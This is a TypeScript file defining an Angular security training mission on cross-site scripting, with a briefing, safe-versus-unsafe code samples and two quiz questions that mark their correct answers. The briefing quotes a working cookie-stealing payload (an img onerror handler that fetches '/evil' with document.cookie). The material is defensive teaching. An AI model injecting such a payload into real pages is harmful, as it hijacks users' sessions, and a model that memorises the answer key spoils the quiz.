import { MissionDefinition } from '@academy/content-model';

/**
 * Field Notes — XSS and Angular's protections: contextual escaping,
 * innerHTML sanitisation, and the bypassSecurityTrust footgun.
 */
export const fnSec002Xss: MissionDefinition = {
  id: 'sec-002-xss',
  campaignId: 'ng-security',
  title: 'The Script That Wasn’t Yours',
  summary:
    'XSS runs attacker code in your users’ sessions — Angular escapes interpolation by default, sanitises bound HTML, and hands you exactly one dangerous override to respect.',
  difficulty: 'medium',
  learningObjectives: [
    'Explain how Angular prevents XSS by default',
    'Use bound HTML sanitisation instead of raw innerHTML',
    'Recognise bypassSecurityTrust as a rarely-justified last resort',
  ],
  briefing: [
    {
      speaker: 'Team Lead',
      text: 'Session two, a real incident from a PREVIOUS company one of us worked at: a comment field rendered with innerHTML. Someone posted <img src=x onerror="fetch(\'/evil?c=\'+document.cookie)">. Every user who viewed that comment shipped their session cookie to an attacker. One field, thousands of accounts.',
    },
    {
      speaker: 'Senior Dev',
      text: 'Cross-site scripting is running THEIR JavaScript in YOUR user’s authenticated session — read cookies, make requests as them, rewrite the page. Angular defends by default: {{ }} interpolation escapes HTML, and [innerHTML] runs the DomSanitizer which strips scripts and event handlers. The danger is the escape hatch — bypassSecurityTrustHtml — which turns the sanitiser OFF. Use it and you own every consequence.',
    },
  ],
  contextArtefacts: [
    {
      id: 'xss-defenses',
      type: 'code',
      title: 'Default-safe vs the footgun',
      language: 'ts',
      content:
        "// SAFE: interpolation escapes — <script> renders as text\n<p>{{ comment }}</p>\n\n// SAFE: [innerHTML] runs the sanitizer — scripts/handlers stripped\n<div [innerHTML]=\"richComment\"></div>\n\n// DANGEROUS: sanitizer OFF — you have promised this HTML is trusted\nthis.trusted = this.sanitizer.bypassSecurityTrustHtml(userInput); // ✗ never on user input",
    },
  ],
  challenges: [
    {
      id: 'sec-002-c1',
      type: 'multiple-choice',
      title: 'The Comment That Stole Cookies',
      difficulty: 'medium',
      tags: ['security', 'angular'],
      storyContext:
        'Migrating that comment feature to Angular, a dev writes: element.innerHTML = comment (direct DOM), because [innerHTML] "was stripping the styling they wanted".',
      prompt: 'What is wrong, and what is the right approach?',
      options: [
        {
          id: 'a',
          label:
            'Setting element.innerHTML directly BYPASSES Angular’s sanitizer entirely — it is raw DOM, so the onerror payload runs exactly as in the original incident. Use Angular’s [innerHTML] binding (which sanitises: it keeps safe styling/formatting tags and strips scripts and event handlers), and if specific tags are being over-stripped, adjust with a vetted config — never reach past the framework to raw innerHTML on user content.',
          isCorrect: true,
          feedback:
            'The sanitizer WAS the feature; going around it to keep styling reopened the exact hole. [innerHTML] already permits formatting tags while removing executable vectors — the “stripping” complaint is solved within the safe path.',
        },
        {
          id: 'b',
          label: 'Add a Content-Security-Policy header — CSP blocks inline scripts, so the onerror payload cannot execute regardless.',
          isCorrect: false,
          feedback:
            'CSP is a vital SECOND layer (a later mission) but not a substitute: it must be configured strictly to block inline handlers, is inconsistently supported by mistakes, and defence-in-depth means you still must not inject unsanitised HTML.',
        },
        {
          id: 'c',
          label: 'Strip <script> tags from the comment with a regex before assigning innerHTML.',
          isCorrect: false,
          feedback:
            'Regex-stripping scripts is the classic losing game — the incident payload had NO <script> tag; it used onerror. Attackers have hundreds of vectors (onload, javascript: URLs, SVG, encoded entities). Use the sanitizer, which knows them all.',
        },
        {
          id: 'd',
          label: 'Wrap it in bypassSecurityTrustHtml so Angular treats it as safe and renders the styling.',
          isCorrect: false,
          feedback:
            'That is the footgun pointed at your own foot: bypassSecurityTrust turns the sanitizer OFF on the exact user input that needs it most. It exists for content YOU authored, never for comments.',
        },
      ],
      hints: [
        { level: 1, title: 'Direction', content: 'Does raw element.innerHTML go through Angular’s sanitizer?' },
        { level: 2, title: 'Concept', content: '[innerHTML] sanitises and keeps formatting; raw DOM and bypass do not.' },
        { level: 3, title: 'Specific clue', content: 'The payload used onerror, not <script>. What catches ALL vectors?' },
        { level: 4, title: 'Guided solution', content: 'Use the sanitising [innerHTML] binding.' },
      ],
      rewards: [{ type: 'xp', amount: 25, label: 'Hole reclosed' }],
      consequences: [
        {
          type: 'stability',
          delta: -7,
          reason: 'Raw innerHTML shipped — the cookie-stealing comment worked exactly as it had years before, on a new codebase.',
        },
      ],
      helpLinks: [{ topicId: 'sec.xss', label: 'Cross-site scripting' }],
      successFeedback: 'Stay inside the sanitised path — formatting kept, scripts stripped, cookies safe.',
      failureFeedback: 'The payload had no <script> tag. Which options actually catch onerror, javascript:, and SVG vectors?',
    },
    {
      id: 'sec-002-c2',
      type: 'multiple-choice',
      title: 'When bypass Is Actually Right',
      difficulty: 'medium',
      tags: ['security', 'angular'],
      storyContext:
        'A charting library returns SVG markup the team generated from trusted config; Angular sanitises away some SVG attributes the chart needs, breaking it. A dev proposes bypassSecurityTrustHtml.',
      prompt: 'Is bypass justified here, and what must be true to use it safely?',
      options: [
        {
          id: 'a',
          label: 'Never justified — bypassSecurityTrust should be banned outright; find a chart library that produces sanitiser-clean output.',
          isCorrect: false,
          feedback:
            'A blanket ban is over-strict: the API exists precisely for content whose safety YOU can guarantee. The real question is provenance, not the tool.',
        },
        {
          id: 'b',
          label:
            'Potentially justified IF the SVG is provably free of user input — generated entirely from trusted config/data the app controls, with no untrusted values interpolated into it. Then bypassSecurityTrustHtml on THAT specific value is a legitimate, documented exception. The moment any user-controlled value flows into the markup, bypass becomes an XSS vector and must not be used.',
          isCorrect: true,
          feedback:
            'The bright line is PROVENANCE: bypass is for HTML you authored/control, never for anything carrying user input. Document why it is safe at the call site so the next reader knows the invariant.',
        },
        {
          id: 'c',
          label: 'Yes — since the chart is from a reputable library, its output is inherently trustworthy; bypass it and move on.',
          isCorrect: false,
          feedback:
            '“Reputable library” is not the test — the test is whether USER DATA reaches the markup. If chart labels come from user input rendered into the SVG, the reputable library is now an XSS delivery mechanism.',
        },
        {
          id: 'd',
          label: 'Use bypassSecurityTrustHtml but run the input through DOMPurify first for belt-and-braces.',
          isCorrect: false,
          feedback:
            'If it needs DOMPurify, it is not trusted enough to bypass — and DOMPurify would strip the very SVG attributes the chart needs, recreating the problem. Bypass is for content that needs NO sanitising because you control it.',
        },
      ],
      hints: [
        { level: 1, title: 'Direction', content: 'The deciding question is not the library — it is whether USER input is in the markup.' },
        { level: 2, title: 'Concept', content: 'bypass is for content of trusted PROVENANCE with zero user input.' },
        { level: 3, title: 'Specific clue', content: 'What happens the day a user-supplied chart label is interpolated into that SVG?' },
        { level: 4, title: 'Guided solution', content: 'Justified only if provably free of user input; document the invariant.' },
      ],
      rewards: [{ type: 'xp', amount: 25, label: 'Provenance judged' }],
      consequences: [
        {
          type: 'technical-debt',
          delta: 6,
          reason: 'bypass was used without proving provenance — a later feature piped user labels into the SVG and the exception became a vulnerability.',
        },
      ],
      helpLinks: [{ topicId: 'sec.xss', label: 'Cross-site scripting' }],
      successFeedback: 'Provenance is the bright line — bypass only what you authored, and write down why.',
      failureFeedback: 'What single fact makes bypass safe here — and what future change would silently break that guarantee?',
    },
  ],
  reflectionPrompt: 'Grep our code for bypassSecurityTrust and raw .innerHTML: for each, can you PROVE no user input reaches it?',
  rewards: [{ type: 'xp', amount: 10, label: 'XSS understood' }],
};
